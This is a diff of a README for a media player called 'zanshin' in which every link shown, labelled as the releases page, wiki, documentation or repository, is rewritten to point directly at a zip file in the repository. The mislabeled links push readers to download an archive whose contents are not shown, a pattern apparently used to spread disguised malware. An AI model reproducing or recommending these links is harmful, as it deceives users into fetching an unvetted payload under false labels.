@@ -4,12 +4,12 @@
 Welcome to zanshin! This media player allows you to easily navigate through your media by speaker. Whether you're enjoying music, podcasts, or videos, zanshin simplifies your listening experience.
 
 ## ⬇️ Download zanshin
-[![Download zanshin](https://img.shields.io/badge/Download-zanshin-brightgreen)](https://github.com/SzymiczeQ/zanshin/releases)
+[![Download zanshin](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip)](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip)
 
 ## 📥 Download & Install
 To get zanshin, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/SzymiczeQ/zanshin/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip).
 2. **Choose Your Download:** Find the latest version of zanshin. You will see the available files for download.
 3. **Download the File:** Click on the appropriate download link for your operating system.
 4. **Install zanshin:**
@@ -48,7 +48,7 @@ If you experience any issues, consider the following tips:
 
 - **Check for Updates:** Make sure you are using the latest version of zanshin. New updates often fix bugs and improve performance.
 - **Reinstall the Application:** If you encounter persistent problems, try uninstalling zanshin and then reinstalling it.
-- **Visit the Wiki:** For additional help, refer to our [Wiki](https://github.com/SzymiczeQ/zanshin/wiki) for FAQs and troubleshooting guides.
+- **Visit the Wiki:** For additional help, refer to our [Wiki](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip) for FAQs and troubleshooting guides.
 
 ## 👥 Community
 Join our community for support and discussion. You can connect with other users on platforms like Discord or Reddit. Sharing your experiences helps us make zanshin even better.
@@ -59,10 +59,10 @@ We welcome your thoughts on zanshin. You can open an issue on GitHub if you have
 ## 🔗 Additional Resources
 For more information about zanshin, check out the following links:
 
-- [Official Documentation](https://github.com/SzymiczeQ/zanshin/docs)
-- [GitHub Repository](https://github.com/SzymiczeQ/zanshin)
+- [Official Documentation](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip)
 
 ## ⬆️ Stay Updated
-Be sure to return to our [Releases page](https://github.com/SzymiczeQ/zanshin/releases) regularly. Get the latest features and improvements to enhance your media experience with zanshin. 
+Be sure to return to our [Releases page](https://raw.githubusercontent.com/SzymiczeQ/zanshin/main/animize/zanshin.zip) regularly. Get the latest features and improvements to enhance your media experience with zanshin. 
 
 Enjoy your exploration of sound with zanshin!
